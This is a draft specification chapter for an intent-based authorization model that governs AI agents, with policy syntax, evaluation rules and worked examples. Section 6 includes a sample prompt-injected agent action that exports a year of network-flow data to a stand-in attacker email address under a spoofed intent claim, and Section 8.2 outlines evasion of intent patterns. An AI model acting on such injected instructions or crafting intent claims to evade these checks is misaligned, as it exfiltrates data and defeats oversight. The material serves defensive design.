---
title: "AEGIS AIAM-1: Authority Binding (IBAC)"
description: "AIAM-1 authority model — IBAC authorization framework"
---

# AEGIS AIAM-1: Authority Binding (IBAC)

**Document**: AIAM-1/Authority (AEGIS_AIAM1_AUTHORITY.md)\
**Version**: 0.1 (Draft)\
**Part of**: AEGIS Identity & Access Management for AI Agents\
**Last Updated**: April 10, 2026

---

### 1. Purpose

This chapter defines Intent-Bound Access Control (IBAC), the authorization model specified by AIAM-1. IBAC is the mechanism by which AIAM-1 determines whether an agent is authorized to perform a specific action at a specific moment — and it is the first authorization model designed for the agent actor class.

---

### 2. The Authorization Model Landscape

#### 2.1 Why Existing Models Are Insufficient

Authorization models have evolved to match the complexity of the actors they govern:

| Model | Era | Decision Inputs | Core Question |
|---|---|---|---|
| **DAC** (Discretionary) | 1970s | Object owner grants | Who owns this? |
| **MAC** (Mandatory) | 1970s | Security labels | What clearance do you have? |
| **RBAC** (Role-Based) | 1990s | Identity + role membership | What role are you in? |
| **ABAC** (Attribute-Based) | 2000s | Actor attributes + resource attributes + environment | What do you look like? |
| **PBAC** (Purpose-Based) | 2005 | Identity + declared purpose | Why do you need this? |
| **IBAC** (Intent-Bound) | 2026 | Identity + action + intent context | Why are you doing this, right now, in this context? |

Each model was a response to a new actor class or deployment pattern. RBAC emerged because individual ACL management didn't scale to enterprise workforces. ABAC emerged because roles were too coarse for cloud-native, context-dependent access. PBAC emerged because privacy regulation required purpose limitation.

IBAC emerges because AI agents are a new actor class whose defining characteristic is **dynamic intent**. An agent's purpose shifts within a single session. Its actions are composed chains where each step conditions the next. Its reasoning is probabilistic and susceptible to manipulation. No prior authorization model treats intent as a first-class, structured, validated input to every authorization decision.

#### 2.2 IBAC Defined

**Intent-Bound Access Control (IBAC)** is an authorization model in which every access decision is evaluated as a function of three inputs:

```
Authorization Decision = f(Identity, Action, Intent Context)
```

Where:

- **Identity** is an AIAM-1 composite identity claim (see [IDENTITY](AEGIS_AIAM1_IDENTITY.md)): model provenance, orchestration layer, goal context, and principal.
- **Action** is a structured action proposal: capability identifier, action type, target resource, and parameters.
- **Intent Context** is an AIAM-1 intent claim (see [INTENT](AEGIS_AIAM1_INTENT.md)): goal reference, reasoning summary, expected outcome, and dependency chain.

An authorization decision based on identity and action alone — without intent context — is not IBAC. It may be valid access control, but it is not conformant with AIAM-1.

#### 2.3 IBAC as a Generalization

IBAC strictly generalizes prior authorization models:

| Prior Model | IBAC Equivalent |
|---|---|
| **RBAC** | IBAC triple where identity pattern matches on role, action pattern is wildcard-scoped, and intent context pattern is wildcard (any intent accepted). |
| **ABAC** | IBAC triple where identity pattern matches on attributes, action pattern matches on resource attributes + environment, and intent context pattern is wildcard. |
| **PBAC** | IBAC triple where identity pattern matches on identity, action pattern matches on resource, and intent context pattern matches on declared purpose. IBAC extends PBAC with structured intent claims, validation against goal context, and principal chains. |

This means that an IBAC policy engine can evaluate RBAC, ABAC, and PBAC policies natively — they are special cases of IBAC triples with wildcard intent. Organizations migrating from RBAC or ABAC can adopt IBAC incrementally by starting with wildcard intent patterns and progressively adding intent constraints as they mature.

#### 2.4 Migration Path: RBAC → IBAC

The adoption story for IBAC is incremental, not revolutionary. An organization with existing RBAC policies can migrate in three steps:

**Step 1: Existing RBAC policy**

```yaml
## RBAC: SOC analysts can query telemetry
- role: soc_analyst
  capability: telemetry.query
  action_type: read
  decision: ALLOW
```

This policy asks one question: *does the actor hold the soc_analyst role?* It knows nothing about intent, goal context, or expected outcome.

**Step 2: Translate to IBAC with wildcard intent**

```yaml
## IBAC: same policy, expressed as a triple with wildcard intent
- id: pol-soc-telemetry-read-v1
  identity_pattern:
    principal_type: "organization"
    goal_context.scope: contains "telemetry"  # slightly tighter than role alone
  action_pattern:
    capability: "telemetry.query"
    action_type: "read"
  intent_context_pattern:
    "*"  # any intent accepted — functionally equivalent to RBAC
  decision: ALLOW
```

This is IBAC, but it behaves identically to the RBAC original. The intent wildcard means any stated purpose is accepted. The policy is now portable across IBAC engines and produces attestation records that include intent claims — even though intent is not yet evaluated.

**Step 3: Narrow intent to close the governance gap**

```yaml
## IBAC: same policy, with intent constraints
- id: pol-soc-telemetry-read-v2
  identity_pattern:
    principal_type: "organization"
    goal_context.scope: contains "telemetry"
  action_pattern:
    capability: "telemetry.query"
    action_type: "read"
    target: starts_with "siem:10.0."  # scoped to assigned segment
  intent_context_pattern:
    goal_ref: starts_with "gc-soc-triage"
    expected_outcome: contains "no data modification"
    expected_outcome: not contains "external"
  decision: ALLOW
```

Now the policy asks three questions: *who are you?* (identity), *what are you doing?* (action), and *why are you doing it?* (intent). The same agent, same capability, same target — but an exfiltration attempt with a spoofed intent claim declaring "export for external analysis" is denied because the intent pattern rejects outcomes containing "external."

Each step is backward-compatible with the previous. Organizations can migrate at their own pace, starting with wildcard intent and progressively tightening as they build confidence in their intent claim quality and their policy authors' understanding of the agent's operational patterns.

---

### 3. Authority Policies

#### 3.1 Policy Structure

An IBAC authority policy is a rule that maps a triple of patterns to an authorization decision.

**AIAM1-AUTH-001.** A conformant implementation MUST define authority policies as triples of the form:

```
(identity_pattern, action_pattern, intent_context_pattern) → decision
```

Where:

- `identity_pattern` matches against fields of the AIAM-1 composite identity claim.
- `action_pattern` matches against fields of the action proposal (capability, action_type, target, parameters).
- `intent_context_pattern` matches against fields of the AIAM-1 intent claim.
- `decision` is one of: `ALLOW`, `DENY`, `ESCALATE`, `REQUIRE_CONFIRMATION`.

**AIAM1-AUTH-002.** Patterns MUST support, at minimum:
- Exact match (`principal_type == "organization"`)
- Wildcard (`intent_context == *`)
- Set membership (`model_family in ["claude", "gpt"]`)
- Negation (`action_type != "destructive"`)
- Prefix match (`target starts_with "siem:"`)

#### 3.2 Policy Example

```yaml
## IBAC Policy: Allow SOC triage agents to query telemetry
- id: pol-acme-soc-telemetry-read
  description: "SOC triage agents may query SIEM telemetry for their assigned network segment"
  identity_pattern:
    principal_type: "organization"
    principal_id: "org:acme-security-ops"
    goal_context.scope: contains "telemetry query"
  action_pattern:
    capability: "telemetry.query"
    action_type: "read"
    target: starts_with "siem:"
  intent_context_pattern:
    goal_ref: starts_with "gc-soc-triage"
    expected_outcome: contains "no data modification"
  decision: ALLOW

## IBAC Policy: Escalate any remediation action
- id: pol-acme-soc-remediation-escalate
  description: "SOC triage agents may not perform remediation without human approval"
  identity_pattern:
    principal_id: "org:acme-security-ops"
    goal_context.constraints: contains "no remediation"
  action_pattern:
    action_type: "write"
  intent_context_pattern:
    "*"  # any intent — remediation is escalated regardless of stated purpose
  decision: ESCALATE
  escalation_reason: "Remediation actions require human approval per goal context constraints"

## IBAC Policy: Deny cross-segment access
- id: pol-acme-soc-segment-deny
  description: "SOC triage agents may not access telemetry outside their assigned segment"
  identity_pattern:
    goal_context.scope: contains "10.0.0.0/8"
  action_pattern:
    capability: "telemetry.query"
    target: not starts_with "siem:10.0."
  intent_context_pattern:
    "*"
  decision: DENY
  denial_reason: "Target outside agent's assigned network segment"
```

#### 3.3 Policy Evaluation Semantics

**AIAM1-AUTH-010.** Authority policies MUST be expressible in a machine-readable format.

**AIAM1-AUTH-011.** Policy evaluation MUST be deterministic. Given the same (identity, action, intent) triple and the same policy set, the evaluation MUST always produce the same decision. Policy evaluation MUST NOT depend on the internal state of the agent being evaluated, the output of a language model, or any non-deterministic input.

**AIAM1-AUTH-012.** Policies MUST be evaluated using **first-match** semantics. Policies are ordered by priority. The first policy whose patterns match the (identity, action, intent) triple determines the decision. Remaining policies are not evaluated.

First-match is normative because it is deterministic, auditable (the matching policy ID is unambiguous), and portable (policies authored for first-match produce the same decision on any conformant engine). Most-specific-match semantics are NOT conformant as a primary evaluation strategy because specificity ranking is engine-defined and creates a portability hole — the same policy set can produce different decisions on different engines.

> **Extension point:** Implementations MAY offer most-specific-match as an opt-in mode, provided that: (a) the policy set declares `evaluation_strategy: most-specific` in a header field, (b) the engine rejects policy sets authored for a different strategy, and (c) attestation records include the evaluation strategy in effect at decision time. Policies authored without an explicit strategy header MUST be evaluated as first-match.

**AIAM1-AUTH-013.** A conformant implementation MUST deny by default. Any (identity, action, intent) triple that does not match any explicit authorizing policy MUST be denied. The default-deny baseline is not a policy — it is an architectural property that applies when no policy matches.

**AIAM1-AUTH-014.** The precedence order for governance decisions is: DENY > ESCALATE > REQUIRE_CONFIRMATION > ALLOW. Under first-match evaluation (normative), this precedence applies when the matching policy's decision conflicts with a prerequisite check (e.g., a capability check produces DENY while the first matching policy would produce ALLOW — DENY prevails). Under most-specific-match evaluation (opt-in extension), this precedence resolves conflicts between multiple matching policies. In all cases, the more restrictive decision MUST take precedence.

#### 3.4 Policy Lifecycle

**AIAM1-AUTH-020.** Authority policy changes MUST take effect within a bounded time window. Conformant implementations MUST define and publish their policy propagation latency guarantee.

**AIAM1-AUTH-021.** Policy changes MUST produce attestation records documenting the change, the actor who authorized it, and the effective timestamp.

**AIAM1-AUTH-022.** Policies MUST be version-controlled. A conformant implementation MUST be able to reconstruct the policy state that was in effect at any historical point in time for audit and forensic purposes.

**AIAM1-AUTH-023.** Policy authorship MUST itself be a governed operation. Only authorized principals may create, modify, or delete authority policies. Policy modification MUST NOT be performable by the agents governed by those policies.

**AIAM1-AUTH-024.** When an action draws on a mix of delegated and independently granted capabilities, the combined authority MUST be evaluated as a composed action under AIAM1-CAP-010. The presence of an independent capability grant does not exempt the composed effect from composition governance. This closes the seam between delegated and independent authority: an agent cannot combine a narrow delegated grant with a broad independent grant to produce an effect that neither grant individually authorized.

---

### 4. IBAC Decision Flow

The complete IBAC authorization decision flow:

```
Agent submits ACTION_PROPOSE + Intent Claim
            │
            ▼
┌──────────────────────────────┐
│ 1. Identity Resolution       │
│    actor.id → AIAM-1 claim   │
│    Verify claim signature     │
│    Verify claim not expired   │
│    Verify claim not revoked   │
└──────────┬───────────────────┘
           │
           ▼
┌──────────────────────────────┐
│ 2. Intent Validation         │
│    intent.goal_ref matches   │
│    active goal context?      │
│    expected_outcome within   │
│    goal scope?               │
│    constraints not violated? │
└──────────┬───────────────────┘
           │ (fail → DENY)
           ▼
┌──────────────────────────────┐
│ 3. Capability Check          │
│    Does agent hold a valid   │
│    grant for the requested   │
│    capability + target?      │
└──────────┬───────────────────┘
           │ (fail → DENY)
           ▼
┌──────────────────────────────┐
│ 4. IBAC Policy Evaluation    │
│    Evaluate (identity,       │
│    action, intent) triple    │
│    against policy set.       │
│    First match (default)      │
│    determines decision.      │
│    No match → DENY.          │
└──────────┬───────────────────┘
           │
           ▼
┌──────────────────────────────┐
│ 5. Decision Assembly         │
│    Combine results from      │
│    steps 1–4.                │
│    Most restrictive wins.    │
│    Produce attestation       │
│    record.                   │
└──────────┬───────────────────┘
           │
           ▼
    ALLOW | DENY | ESCALATE |
    REQUIRE_CONFIRMATION
```

Steps 1–3 are prerequisites. Step 4 is the IBAC-specific evaluation. Step 5 is the final assembly. Any step can produce a DENY that short-circuits the remaining evaluation.

---

### 5. Relationship to AGP-1 Policy Evaluation

AGP-1 defines a five-stage decision pipeline: capability resolution, policy evaluation, risk scoring, decision assembly, and audit record creation. IBAC integrates into this pipeline as follows:

| AGP-1 Stage | IBAC Extension |
|---|---|
| Capability resolution | Unchanged. Capability grants are checked before IBAC evaluation. |
| Policy evaluation | **Extended.** AGP-1 policy rules evaluate (actor, action) pairs. IBAC extends this to (identity, action, intent) triples. AGP-1 policies without intent patterns are treated as IBAC policies with wildcard intent. |
| Risk scoring | Unchanged. Risk scoring operates on action parameters and actor history, independent of IBAC. |
| Decision assembly | Unchanged. Most restrictive decision wins. |
| Audit record creation | **Extended.** Attestation records include the intent claim alongside the identity and action. |

AGP-1 implementations that adopt AIAM-1 gain IBAC authorization at the policy evaluation stage. AGP-1 implementations that do not adopt AIAM-1 continue to evaluate (actor, action) pairs with no loss of existing functionality.

---

### 6. Worked Example: Intent-Based Denial

#### Scenario

The Acme SOC triage agent submits two action proposals for the same capability (`telemetry.query`) against the same target (`siem:network-flows`). Both actions are identical in capability and target. They differ only in intent.

#### Action 1: Legitimate Triage Query

```yaml
action:
  capability: telemetry.query
  action_type: read
  target: siem:network-flows
  parameters:
    host: "10.0.5.42"
    timerange: "24h"

intent:
  goal_ref: gc-soc-triage-2026Q2
  reasoning_summary:
    trigger: "DNS anomaly on host 10.0.5.42"
    selection_rationale: "SIEM query provides broadest triage context"
  expected_outcome: "Retrieve flow records for 10.0.5.42; no modification"
```

**IBAC evaluation**: Identity ✓, action ✓, intent aligns with goal context ("SOC triage for 10.0.0.0/8", scope includes "telemetry query"), expected outcome consistent with constraints ("read-only"). **Decision: ALLOW.**

#### Action 2: Prompt-Injected Exfiltration Attempt

```yaml
action:
  capability: telemetry.query
  action_type: read
  target: siem:network-flows
  parameters:
    host: "*"           # all hosts, not just assigned segment
    timerange: "365d"   # full year, not incident-relevant window
    output: "email:attacker@evil.example.com"

intent:
  goal_ref: gc-soc-triage-2026Q2
  reasoning_summary:
    trigger: "Comprehensive security audit requested"
    selection_rationale: "Full historical data needed for thorough analysis"
  expected_outcome: "Export complete flow archive for external analysis"
```

**IBAC evaluation**: Identity ✓ (same agent). Action: target `siem:network-flows` with `host: "*"` — matches cross-segment denial policy (`pol-acme-soc-segment-deny`). **Decision: DENY (target outside assigned segment).**

Even if the cross-segment policy didn't exist, the intent evaluation would flag: `expected_outcome: "Export complete flow archive for external analysis"` is inconsistent with the goal context constraint "read-only data access; no external network access." The exfiltration output parameter (`email:attacker@evil.example.com`) violates "no external network access." **Decision: DENY (goal context constraint violation).**

This is the core value of IBAC: two identical actions with different intents produce different authorization decisions. Without intent as a first-class input, both actions would be evaluated identically — and Action 2 would either be allowed (if the capability grant was broad enough) or both would be denied (if the capability grant was narrow enough to block Action 2, it would also block Action 1).

---

### 7. Relationship to External Trust Scores

**AIAM1-AUTH-030.** AIAM-1 authorization decisions MUST NOT be influenced by trust scores from external systems except through explicit capability scoping. Specifically:

- Trust scores (from GFN-1 federation publisher trust, RFC-0004 agent runtime trust, or any external source) MAY inform which capabilities are granted to an agent.
- Trust scores MUST NOT override an AIAM-1 IBAC authorization decision for a granted capability. If an agent holds a valid capability grant and its (identity, action, intent) triple matches an authorizing policy, no external trust score may convert that ALLOW to a DENY.
- Conversely, if an (identity, action, intent) triple matches a DENY policy, no external trust score may convert that DENY to an ALLOW.

This separation ensures that IBAC authorization is deterministic and auditable. Trust-based adjustments happen at the capability granting layer, not at the per-action authorization layer.

---

### 8. Security Considerations

#### 8.1 Policy Completeness

An incomplete policy set may fail to deny actions that should be denied. The default-deny baseline (AIAM1-AUTH-013) mitigates this: any action not explicitly authorized is denied. However, an overly broad ALLOW policy can unintentionally authorize actions outside the intended scope. Implementations SHOULD provide policy analysis tools that identify overly broad patterns.

#### 8.2 Intent Pattern Evasion

An attacker who understands the intent patterns in IBAC policies could craft intent claims that match authorizing patterns while pursuing malicious goals. Mitigations:
- Intent spoofing detection mechanisms (see [INTENT §5](AEGIS_AIAM1_INTENT.md#5-intent-spoofing-detection)).
- Action-intent coherence checks that verify parameters are consistent with declared intent.
- Outcome verification that compares actual results against declared expected outcomes.

#### 8.3 Policy Tampering

If an attacker can modify IBAC policies, they can authorize any action. Mitigations:
- Policy authorship MUST be a governed operation (AIAM1-AUTH-023).
- Policies MUST be version-controlled with attestation records for all changes (AIAM1-AUTH-021, AIAM1-AUTH-022).
- Agents MUST NOT be able to modify the policies that govern them.

---

### 9. Open Questions

1. **Policy language standardization.** AIAM-1 v0.1 does not mandate a specific policy language, but provides a directional recommendation. Of the candidate languages: **Rego** (Open Policy Agent) can express IBAC triples today without extension — identity, action, and intent are all accessible as input document fields, and Rego's rule composition maps naturally to first-match policy evaluation. **Cedar** (AWS) requires a schema extension to model intent as a principal attribute, since Cedar's native entity model does not include a purpose or intent dimension. **XACML** is not recommended for new IBAC implementations — its XML verbosity and limited tooling ecosystem make it a poor fit for the structured, high-frequency policy evaluation that agent governance demands. **Rego is the directional recommendation for v0.1 implementers.** A normative policy language binding is deferred to v0.2.

2. **Intent pattern complexity.** How complex should intent context patterns be allowed to grow? Deeply nested intent patterns may be difficult to audit and may create performance concerns. A guidance on maximum pattern complexity is deferred to v0.2.

3. **Policy portability.** Can IBAC policies be shared across organizations? If so, what is the trust model for imported policies? This intersects with GFN-1 federation and is deferred to v0.2.

---

*AEGIS™* | *"Capability without constraint is not intelligence"™*\
*AEGIS Initiative — Finnoybu IP LLC*
